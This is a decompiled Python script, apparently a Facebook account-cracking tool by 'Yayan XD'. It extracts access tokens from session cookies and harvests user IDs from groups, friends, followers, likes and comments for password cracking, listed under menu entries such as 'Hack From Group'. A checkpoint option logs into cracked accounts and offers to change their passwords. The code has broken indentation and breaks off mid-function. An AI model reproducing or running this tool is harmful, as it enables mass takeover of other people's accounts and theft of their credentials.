# Decompiled By RandiSr
# Github : https://github.com/RANDIOLOY
# code by Yayan XD
# my facebook ( https://www.facebook.com/KM39453 )

#      (C) Copyright 407 Authentic Exploit
#      Rebuild Copyright Can't make u real programmer:)
#      Coded By Yayan XD.

import os
try:
    import requests
except ImportError:
    print('\n [Ã—] The requests module is not installed!...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [Ã—] Futures module is not installed yet!...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [Ã—] Bs4 module is not installed yet!...\n')
    os.system('pip install bs4')

try:
    import rich
except ImportError:
    print('\n [Ã—] Rich module is not installed!...\n')
    os.system('pip install rich')
    
    ### Import Module
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,platform,base64
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
from urllib.parse import quote


### Perumpamaan Module & Syntax
_req_ses_  = requests.Session()
_req_get_  = requests.get
_req_post_ = requests.post
_js_lo_    = json.loads
_cici_azimvau_    = input
_azimvau_dapunta_ = open
_cici_cici_       = exit

### Host & Penampungan

r = str(random.randint(1,9999))
rx = r.replace("1","A").replace("2","C").replace("3","B").replace("4","E").replace("5","H").replace("6","I").replace("7","Y")
plist = (platform.uname())[2]
basex = plist
basex1 = basex.encode('ascii')
basex2 = base64.b64encode(basex1)
basex3 = basex2.decode('ascii')
base4 = (basex3).upper()
basesplit = base4.replace('=', 'N').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', 'R').replace("5","X").replace("1","X")

try:
    rq = requests.get('https://pastebin.com/7Qktzsdy').text
except requests.exceptions.ConnectionError:
    print('\nNO INTERNET CONNECTION\n')
    exit()

import requests, os, re, bs4, sys, json, time, random, datetime, threading, itertools, urllib
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from bs4 import BeautifulSoup
# MODULE RICH IN PYTHON
from rich import print as prints
from rich.panel import Panel

ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#  Moch Yayan Juan Alvredo XD.  #
#------------------------------->
### WARNA MODULE RICH ###
tebal  = '[b]'
merah  = '[#FF0022]'
pink   = '[#FF0099]'
hijau  = '[#00FF33]'
kuning = '[#FFFF00]'
hapus  = '[/]'
biru_m = '[cyan]'
############################ RESPONSE FACEBOOK ###########################################
data,data2={},{}
ubahP,pwBaru=[],[]
aman,cp,salah=0,0,0
Apk, ok, cp, id, loop = [], [], [], [], 0
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
###########################################################################################
url_lookup = "https://lookup-id.com/"
url_mb = "https://mbasic.facebook.com"
url_ip = "https://www.httpbin.org/ip"
url_graph = "https://graph.facebook.com/{}"
###########################################################################################
ikeh, ewew, flow, mene, kexx = "?fields=friends.limit(5000)", "?fields=friends.limit(1000)", "?fields=subscribers.limit(50000)", "check.php", "?key="
###########################################################################################
aedx, ssss, dddd, aaaa = "index.php?", "next=https%3A%2F%2Fdevelopers.facebook.com", "%2Ftools%2Fdebug", "%2Faccesstoken%2F"
###########################################################################################
bbbb, awss, cuii, mmkk = "login", "device-based", "validate-password", "?shbl=0"
# "https://kontol.com/"+cccc+"/"+uvgo+"/"+hhhh+"/"
cccc, uvgo, hhhh = "tools", "debug", "accesstoken"
bahasa = "en-GB,en-US;q=0.9,en;q=0.8"
#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7
###########################################################################################
done = False
def animate():
    os.system("clear")
    for c in itertools.cycle(["[\x1b[1;91mâ– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡]","[\x1b[1;92mâ– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;93mâ– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;94mâ– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;95mâ– â– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;96mâ– â– â– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡]", "[\x1b[1;97mâ– â– â– â– â– â– â– \x1b[0mâ–¡â–¡â–¡]", "[\x1b[1;98mâ– â– â– â– â– â– â– â– \x1b[0mâ–¡â–¡]", "[\x1b[1;99mâ– â– â– â– â– â– â– â– â– \x1b[0mâ–¡]", "[\x1b[1;910mâ– â– â– â– â– â– â– â– â– â– \x1b[0m]"]):
        if done:
            break
        sys.stdout.write(f'\r{N}[{O}â€¢{N}] Checking Approval Status ' + c +"\x1b[0m")
        sys.stdout.flush()
        time.sleep(0.03)
t = threading.Thread(target=animate)
t.start()
time.sleep(4)
done = True
os.system('clear')

# lempankkkkkkkk
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

def mentod():
    prints(Panel(f"     [ Choose Login Method - Please Try One ]"))
    prints(Panel("""[[bold green]1[bold white]]. API METHOD (fast)
[[bold green]2[bold white]]. MBASIC METHOD (slow)
[[bold green]3[bold white]]. MOBILE METHOD (super slow) [[bold green] Recommended [bold white]]"""))

def ingfo():
    prints(Panel(f"""[[bold green]+[bold white]] Result OK Saved To -> results/ID-OK-{ha}-{op}-{ta}.txt
[[bold green]+[bold white]] Result CP Saved To -> results/ID-CP-{ha}-{op}-{ta}.txt

[[bold red]Ã—[bold white]] Turn On Airplane Mode 2 Seconds If No Result."""))
#CRACK SELESAI
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print('\n\n  %s[%s#%s] Crack Complete...\n'%(N,K,N))
        print('  [%s+%s] Total ID-OK : %s%s%s'%(O,N,H,str(len(ok)),N))
        print('  [%s+%s] Total ID-CP : %s%s%s'%(O,N,K,str(len(cp)),N))
        cek_cp = input(f"\n  [{O}?{N}] Bring up the Checkpoint Detector Option [Y/t]: ")
        if cek_cp =="":
            print(f"\n  [{M}!{N}] Oga Dont Leave Am Empty, You Wan Collect? ðŸ˜‚");hasil(ok,cp)
        elif cek_cp in["Y","y"]:
            jalan(f"  [{M}!{N}] Turn On Airplane Mode 3 Seconds First.");time.sleep(5)
            ww=input(f"\n  [{O}?{N}] Change Password When Tap Yes [Y/t]: ")
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f"  [{H}â€¢{N}] Password Example : {H}IDlee{N}")
                pwBar=input(f"\n  [{H}+{N}] Enter New Password : ")
                print("\n")
                if len(pwBar) <= 5:
                    print('\n  %s[%sÃ—%s] Password Minimum 6 Characters'%(N,M,N))
                else:
                    pwBaru.append(pwBar)
            for memek in cp:
                kontol = memek.replace('\n', '')
                titid  = kontol.split('|')
                jalan(f'  {N}[{M}>{N}] Trying to Login to Account : {K}{kontol.replace(" [Ã—] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace(" [Ã—] ", ""), titid[1])
                except requests.exceptions.ConnectionError:
                    continue
                print("")
            print("")
            print('   [ %sChecking Process Complete %s]\n'%(H,N));exit()
        elif cek_cp in["T","t"]:
            exit(f"\n  {O}*{N} Goodbye:)")
        else:
            print(f"\n  [{M}!{N}] Y/t ");hasil(ok,cp)
    else:
        print('\n\n  [%s!%s] Opshh You Are Not Getting Results :('%(M,N));exit()

def yayanxd():
    os.system('clear')
    WAR = random.choice(["[deep_pink3]","[red]","[green]","[cyan]","[blue]"])
        prints(Panel(f"""[[bold blue]01[bold white]]. Login Using Token
[[bold blue]02[bold white]]. Login Using Cookies
[[bold blue]03[bold white]]. Login Using User And Password"""))
    p = input(f"  [{K}?{N}] Select : ")
    if p =="":
        print(f"\n  [{M}!{N}] Oga Dont Leave Am Empty, You Wan Collect? ðŸ˜‚");time.sleep(3);yayanxd()
    elif p in["1","01"]:
        login_token()
    elif p in["2","02"]:
        login_cookie()
    elif p in["3","03"]:
        login_passwod()
    else:
        print(f"\n  [{M}!{N}] Correct Input.");time.sleep(3);yayanxd()
#LOGIN TOKEN
def login_token():
    prints(Panel("      [[bold green]â€¢[bold white]] Enter your Facebook Token [[bold green]â€¢[bold white]]"))
    token = input(f"  [{O}?{N}] Facebook Token :{H} ")
    animation = ["[\x1b[1;91mâ– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡]","[\x1b[1;92mâ– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;93mâ– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;94mâ– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;95mâ– â– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;96mâ– â– â– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡]", "[\x1b[1;97mâ– â– â– â– â– â– â– \x1b[0mâ–¡â–¡â–¡]", "[\x1b[1;98mâ– â– â– â– â– â– â– â– \x1b[0mâ–¡â–¡]", "[\x1b[1;99mâ– â– â– â– â– â– â– â– â– \x1b[0mâ–¡]", "[\x1b[1;910mâ– â– â– â– â– â– â– â– â– â– \x1b[0m]"]
    print("")
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r  {N}[{O}â€¢{N}] {H}Process...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")
    try:
        nama = requests.get(url_graph.format(f"/me?fields&access_token={token}")).json()["name"]
        open('.token.txt', 'a').write(token)
        prints(Panel(f"""[[bold green]âœ“[bold white]] Dear [bold green]{nama}[bold white] Your token is Good But Not Strong!
[[bold red]>[bold white]] Use This Tool Wisely!, You Are Responsible For Whatever You Do With This Tool.. Becareful Make SARS Shaa No Catch You ðŸ˜‚ðŸ˜‚ðŸ˜‚ðŸ˜‚!"""));time.sleep(0.3)
        exit(f"\n  [{M}!{N}] Rerun The Command By Typing Python ")
    except (AttributeError,KeyError):
        exit(f"\n  {N}[{M}!{N}] Token Invalid!")
    except UnboundLocalError:
        exit(f"\n  {N}[{M}!{N}] Token Invalid!")
    except requests.exceptions.ConnectionError:
        exit(f"\n  {N}[{M}!{N}] No Connection\n")
#LOGIN COOKIE
def login_cookie():
    prints(Panel("      [[bold green]â€¢[bold white]] Enter your Facebook Cookies [[bold green]â€¢[bold white]]"))
    cookie = input(f"  [{O}?{N}] Facebook Cookies :{H} ")
    animation = ["[\x1b[1;91mâ– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡]","[\x1b[1;92mâ– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;93mâ– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;94mâ– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;95mâ– â– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;96mâ– â– â– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡]", "[\x1b[1;97mâ– â– â– â– â– â– â– \x1b[0mâ–¡â–¡â–¡]", "[\x1b[1;98mâ– â– â– â– â– â– â– â– \x1b[0mâ–¡â–¡]", "[\x1b[1;99mâ– â– â– â– â– â– â– â– â– \x1b[0mâ–¡]", "[\x1b[1;910mâ– â– â– â– â– â– â– â– â– â– \x1b[0m]"]
    print("")
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r  {N}[{O}â€¢{N}] {H}Process...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")
    try:
        data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer":"https://www.facebook.com/","host":"business.facebook.com","origin":"https://business.facebook.com","upgrade-insecure-requests":"1","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control":"max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie})
        find_token = re.search("(EAAG\w+)", data.text)
        open('.cokie.txt', 'a').write(cookie)
        open('.token.txt', 'a').write(find_token.group(1))
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(find_token.group(1))).json()['name']
        prints(Panel(f"""[[bold green]âœ“[bold white]] Dear [bold green]{nama}[bold white] Your Cookies Is Good But Not Strong!
[[bold red]>[bold white]] Use This Tool Wisely!, You Are Responsible For Whatever You Do With This Tool.. Becareful Make SARS Shaa No Catch You ðŸ˜‚ðŸ˜‚ðŸ˜‚ðŸ˜‚!"""));time.sleep(0.3)
        exit(f"\n  [{M}!{N}] Rerun The Command By Typing Python libso.txt")
    except (AttributeError,KeyError):
        exit(f"\n  {N}[{M}!{N}] Cookie Invalid!")
    except UnboundLocalError:
        exit(f"\n  {N}[{M}!{N}] Cookie Invalid!")
    except requests.exceptions.ConnectionError:
        exit(f"\n  {N}[{M}!{N}] No Connection\n")
#MASUK PASSWORD
def login_passwod():
    prints(Panel("   [[bold green]â€¢[bold white]] Enter Your Facebook Username And Password [[bold green]â€¢[bold white]]"))
    session=requests.Session()
    user = input(f"  [{K}?{N}] Enter Username : ")
    pasw = input(f"  [{K}?{N}] Enter Password : ")
    animation = ["[\x1b[1;91mâ– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡]","[\x1b[1;92mâ– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;93mâ– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;94mâ– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;95mâ– â– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;96mâ– â– â– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡]", "[\x1b[1;97mâ– â– â– â– â– â– â– \x1b[0mâ–¡â–¡â–¡]", "[\x1b[1;98mâ– â– â– â– â– â– â– â– \x1b[0mâ–¡â–¡]", "[\x1b[1;99mâ– â– â– â– â– â– â– â– â– \x1b[0mâ–¡]", "[\x1b[1;910mâ– â– â– â– â– â– â– â– â– â– \x1b[0m]"]
    print("")
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r  {N}[{O}â€¢{N}] {H}Process...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")
    try:
        header = {
            "Host"                      : "m.facebook.com",
            "upgrade-insecure-requests" : "1",
            "user-agent"                : "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
            "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "dnt"                       : "1",
            "x-requested-with"          : "mark.via.gp",
            "sec-fetch-site"            : "same-origin",
            "sec-fetch-mode"            : "cors",
            "sec-fetch-user"            : "empty",
            "sec-fetch-dest"            : "document",
            "referer"                   : "https://m.facebook.com/",
            "accept-encoding"           : "gzip, deflate br",
            "accept-language"           : bahasa
        }
        r = session.get(f"https://m.facebook.com/{aedx}{ssss}{dddd}{aaaa}", headers=header)
        header1 = {
            "Host"                      : "m.facebook.com",
            "cache-control"             : "max-age=0",
            "upgrade-insecure-requests" : "1",
            "origin"                    : "https://m.facebook.com",
            "content-type"              : "application/x-www-form-urlencoded",
            "user-agent"                : "Mozilla/5.0 (Linux; Android 11; Infinix X695) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36",
            "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "x-requested-with"          : "XMLHttpRequest",
            "sec-fetch-site"            : "same-origin",
            "sec-fetch-mode"            : "cors",
            "sec-fetch-user"            : "empty",
            "sec-fetch-dest"            : "document",
            "referer"                   : "https://m.facebook.com//"+aedx+ssss+dddd+aaaa,
            "accept-encoding"           : "gzip, deflate br",
            "accept-language"           : bahasa
        }
        das = {
            "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
            "uid":user,
            "flow":"login_no_pin",
            "pass":pasw,
            "next":"https://developers.facebook.com/"+cccc+"/"+uvgo+"/"+hhhh+"/",
        }
        po = session.post(f"https://m.facebook.com/{bbbb}/{awss}/{cuii}/{mmkk}", data = das, headers = header1, allow_redirects = False)
        if 'c_user' in session.cookies.get_dict():
            cooz = session.cookies.get_dict()
            coki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
            data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer":"https://www.facebook.com/","host":"business.facebook.com","origin":"https://business.facebook.com","upgrade-insecure-requests":"1","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control":"max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":coki})
            neangan = re.search("(EAAG\w+)", data.text)
            token = neangan.group(1)
            open('.cokie.txt', 'a').write(coki)
            open('.token.txt', 'a').write(token)
            nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(token)).json()['name']
            prints(Panel(f"""[[bold green]âœ“[bold white]] Dear [bold green]{nama}[bold white] Your Username And Password Are Valid!
[[bold red]>[bold white]] Use This Tool Wisely!, You Are Responsible For Whatever You Do With This Tool.. Becareful Make SARS Shaa No Catch You ðŸ˜‚ðŸ˜‚ðŸ˜‚ðŸ˜‚!"""));time.sleep(2)
            print(f"\n  [{M}Ã—{N}] Wait A Minute Showing Cookies And Tokens.\n");time.sleep(4)
            print(f"  [{H}âœ“{N}] Cookie : {H}{coki}{N}");time.sleep(2)
            print(f"  [{H}âœ“{N}] Token  : {H}{token}{N}");time.sleep(2)
            exit(f"\n  [{M}!{N}] Rerun The Command By Typing Python libso.txt")
        elif 'checkpoint' in session.cookies.get_dict():
            exit(f"\n  [{M}!{N}] Checkpoint Affected Account.")
        else:
            exit(f"\n  [{M}Ã—{N}] Incorrect Username And Password!")
    except (AttributeError,KeyError):
        exit(f"\n  [{M}Ã—{N}] Incorrect Username And Password!")
    except UnboundLocalError:
        exit(f"\n  [{M}Ã—{N}] Incorrect Username And Password!")
    except requests.exceptions.ConnectionError:
        exit(f"\n  {N}[{M}!{N}] No Connection\n")
### ORANG GANTENG ###
def moch_yayan():
    os.system('clear')
    WAR = random.choice(["[deep_pink3]","[red]","[green]","[cyan]","[blue]"])
    
    try:
        tokenz = open('.token.txt', 'r').read()
    except IOError:
        print('\n  %s[%sÃ—%s] Cookie Invalid'%(N,M,N));time.sleep(2);os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt');yayanxd()
    try:
        data = urllib.request.urlopen(url_graph.format(f"/me?fields&access_token={tokenz}"))
        nama = json.load(data)["name"]
    except (KeyError, urllib.error.HTTPError):
        print('\n  %s[%sÃ—%s] Cookie Invalid'%(N,M,N));time.sleep(2);os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt');yayanxd()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s!%s] No Connection\n'%(N,M,N))
    prints(Panel(f"        [bold white][[bold green]+[bold white]] Cookie Account <==> [bold green]{nama}[bold white] [[bold green]+[bold white]]"))
    prints(Panel(f"""[[bold green]01[bold white]]. Hack From Group          [[bold green]06[bold white]]. [bold green]Hack From Comments
[[bold green]02[bold white]]. [bold green]Hack From Friend List    [[bold white]07[bold white]]. Checkpoint Detector
[[bold white]03[bold white]]. [bold white]Hack From Followers      [[bold green]08[bold white]]. [bold green]User Agent Settings
[[bold white]04[bold white]]. [bold green]Hack From Post Likes     [[bold white]09[bold white]]. [bold white]Check Hack Result
[[bold green]05[bold white]]. [bold white]Hack From bulk ID        
[[bold white]00[bold white]]. [bold green]Cookie/Token [[bold white]Logout[/bold white]]   [bold white][/bold white]""",title=f'{merah}â€¢{kuning}â€¢{hijau}â€¢{hijau} OPTION MENU {hijau}â€¢{kuning}â€¢{merah}â€¢{hapus}'))
    pepek = input(f'  [{O}*{N}] Menu : ')
    if pepek == '':
        print('\n  %s[%sÃ—%s] Oga Dont Leave Am Empty, You Wan Collect? ðŸ˜‚!'%(N,M,N));time.sleep(2);moch_yayan()
    elif pepek in['1','01']:
            kontol = input(f"\n  [{O}*{N}] Enter Group ID : ")
            if kontol in[""," "]:
                print('\n %s[%sÃ—%s] Oga Dont Leave Am Empty, You Wan Collect? ðŸ˜‚!'%(N,M,N));time.sleep(2);moch_yayan()
            else:
                try:
                    cookiz = open('.cokie.txt').read()
                    kueh  = {"cookie":cookiz}
                except IOError:
                    jalan(f"\n  [{M}Ã—{N}] You Login Using A Token, iF You Want To Crack From A Group Member, Please Login Cookies First");time.sleep(5);os.system('rm -rf .token.txt');yayanxd()
                try:
                    ajg=requests.get(f"https://mbasic.facebook.com/browse/group/members/?id={kontol}",cookies=kueh).text
                    if "Halaman Tidak Ditemukan" in ajg:
                        print(f"\n  %s[%sÃ—%s] Group With ID {kontol} Not found"%(N,M,N));time.sleep(2);moch_yayan()
                    elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
                        print("\n  %s[%sÃ—%s] Facebook Limits Every Activity, Limit Bro, Please Switch Accounts"%(N,M,N));time.sleep(2);moch_yayan()
                    elif "Konten Tidak Ditemukan" in ajg:
                        print(f"\n  %s[%sÃ—%s] Group With ID {kontol} Not found"%(N,M,N));time.sleep(2);moch_yayan()
                    else:
                        print(f"  [{O}*{N}] Group Name : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0][8:])
                        print(f"\n  [{M}!{N}] To Stop Press Ctrl Then Press C On Your Keyboard.")
                        crack_grup(f"https://mbasic.facebook.com/browse/group/members/?id={kontol}", kueh)
                except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                    exit("\n  [!] Connection Error")
    elif pepek in['2','02']:
            try:
                prints(Panel("[[bold cyan]*[bold white]] Type 'me' If You Want To Crack From Your FriendList."))
                try:user = input(f'  [{O}*{N}] Enter ID or Username : ');_memek_ = __convert__(user)
                except AttributeError:exit(f"\n  {N}[{M}Ã—{N}] Username Or ID Is Not Correct")
                data = urllib.request.urlopen(url_graph.format(f"v13.0/{_memek_.get('_kontol_')}{ikeh}&access_token={tokenz}"))
                xxxx = json.load(data)["friends"]
                for x in xxxx["data"]:
                    id.append(x['id'] + '<=>' + x['name'])
            except (KeyError, urllib.error.HTTPError):
                exit(f'\n  {N}[{M}Ã—{N}] Failed To Retrieve ID, Probably ID Is Not Public')
    elif pepek in['3','03']:
            prints(Panel("[[bold cyan]*[bold white]] Type 'me' If You Want To Crack From Your Followers List."))
            try:user = input(f"  [{O}*{N}] Enter ID or Username Followers : ");_memek_ = __convert__(user)
            except AttributeError:exit(f"\n {N}[{M}Ã—{N}] Incorrect Username Or ID")
            data = urllib.request.urlopen(url_graph.format(f"v13.0/{_memek_.get('_kontol_')}{flow}&access_token={tokenz}"))
            xxxx = json.load(data)["subscribers"]
            for x in xxxx["data"]:
                try:
                    id.append(x['id'] + '<=>' + x['name'])
                except:
                    pass
    elif pepek in['4','04']:
            kontol = input(f"\n  [{O}*{N}] Enter Post ID : ")
            if kontol in[""," "]:
                print('\n  %s[%sÃ—%s] Oga Dont Leave Am Empty, You Wan Collect? ðŸ˜‚!'%(N,M,N));time.sleep(2);moch_yayan()
            try:
                cookiz = open('.cokie.txt').read()
                kueh  = {"cookie":cookiz}
            except IOError:
                jalan(f"\n  [{M}Ã—{N}] You Login Using A Token, iF You Want To Crack From A Group Member, Please Login Cookies First");time.sleep(5);os.system('rm -rf .token.txt');yayanxd()
            try:
                print(f"\n  [{M}!{N}] To Stop Press Ctrl Then Press C On Your Keyboard.")
                like_post(f"https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier={kontol}", kueh)
            except KeyError:
                print(f"\n [!] Why {kontol} Think About It Idiot, Enter The Correct Post ID Lol");time.sleep(2);moch_yayan()
    elif pepek in['5','05']:
            _ngocok_(tokenz)
    elif pepek in['6','06']:
            kontol = input(f"\n  [{O}*{N}] Enter Post ID : ")
            if kontol in[""," "]:
                print('\n  %s[%sÃ—%s] Oga Dont Leave Am Empty, You Wan Collect? ðŸ˜‚!'%(N,M,N));time.sleep(2);moch_yayan()
            try:
                cookiz = open('.cokie.txt').read()
                kueh  = {"cookie":cookiz}
            except IOError:
                jalan(f"\n  [{M}Ã—{N}] You Login Using A Token, iF You Want To Crack From A Group Member, Please Login Cookies First");time.sleep(5);os.system('rm -rf .token.txt');yayanxd()
            try:
                print(f"\n  [{M}!{N}] To Stop Press Ctrl Then Press C On Your Keyboard.")
                ngomen_post(f"https://mbasic.facebook.com/{kontol}", kueh)
            except KeyError:
                print(f"\n  [!] Why {kontol} Think About It Idiot, Enter The Correct Post ID Lol");time.sleep(2);moch_yayan()
    elif pepek in['7','07']:
            gabut()
    elif pepek in['8','08']:
        seting_yntkts()
    elif pepek in['9','09']:
        dirs = os.listdir("results")
        prints(Panel("[ Crack Results Stored in Your Files ]"))
        for file in dirs:
            xxxx = open(f"results/{file}").read().splitlines()
            print(f"  [{H}+{N}] {file} -> {H}{len(xxxx)}{N}")
        file = input(f"\n  {N}[{M}?{N}] Enter File Name :{H} ")
        if file == "":
            file = input(f"\n  {N}[{M}?{N}] Enter File Name :{H} ")
        total = open(f"results/{file}").read().splitlines()
        print(f"{N}  [{O}#{N}] --------------------------------------------");time.sleep(2)
        nm_file = ("%s"%(file)).replace("-", " ")
        hps_nm  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "").replace("cp_detektor", "").replace("invalid_ok", "")
        jalan("  [%s*%s] Results %sCrack%s At the Date Of %s:%s%s%s Total %s: %s%s%s"%(M,N,O,N,M,O,hps_nm,N,M,O,len(total),O))
        print(f"{N}  [{O}#{N}] --------------------------------------------");time.sleep(2)
        for memek in total:
            kontol = memek.replace("\n","")
            titid  = kontol.replace(" [âœ“] ","  \x1b[0m[\x1b[1;92mâœ“\x1b[0m]\x1b[1;92m ").replace(" [Ã—] ", "  \x1b[0m[\x1b[1;93mÃ—\x1b[0m]\x1b[1;93m ")
            print(f"{titid}{N}");time.sleep(0.03)
        print(f"{N}  [{O}#{N}] --------------------------------------------");time.sleep(2)
        input('\n   [ %sRETURN%s ] '%(O,N));moch_yayan()
    elif pepek in['10']:
        jalan(f"\n  {H}  >>> Social Media Boosting Site!!<<<{N}\n")
        upd = input("  [?] Do You Want To Checkout ID's Boosting Site? [Y/N]: ")
        if upd =="":
            exit(f"  {N}[{M}Ã—{N}] Y/N !")
        elif upd in["Y","y"]:
            jalan("\n  %s* %sOpening Boosting Site..."%(O,H));time.sleep(0.02)     
        elif upd in["N","n"]:
            jalan(f"{B} Good byee:)");exit()
        else:
            exit(f"  {N}[{M}Ã—{N}] Y/N !")
    elif pepek in['0','00']:
        print("")
        titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
        for x in titik:
            sys.stdout.write('\r  %s[%s+%s] Deleting Cookies %s'%(N,M,N,x)); sys.stdout.flush()
            time.sleep(1)
        os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt')
        exit('\n  %s[%sâœ“%s]%s Cookies Deleted Successfully'%(N,M,N,H))
    else:
        print('\n  %s[%sÃ—%s] Menu [%s%s%s] Oga Try Dey Check Menu, You Wan Collect? ðŸ˜‚!!'%(N,M,N,M,pepek,N));time.sleep(2);moch_yayan()
    return __crack__().plerr(id)

### GANTI USER AGENT
def seting_yntkts():
    prints(Panel("""([bold cyan]1[bold white]) Change User Agent
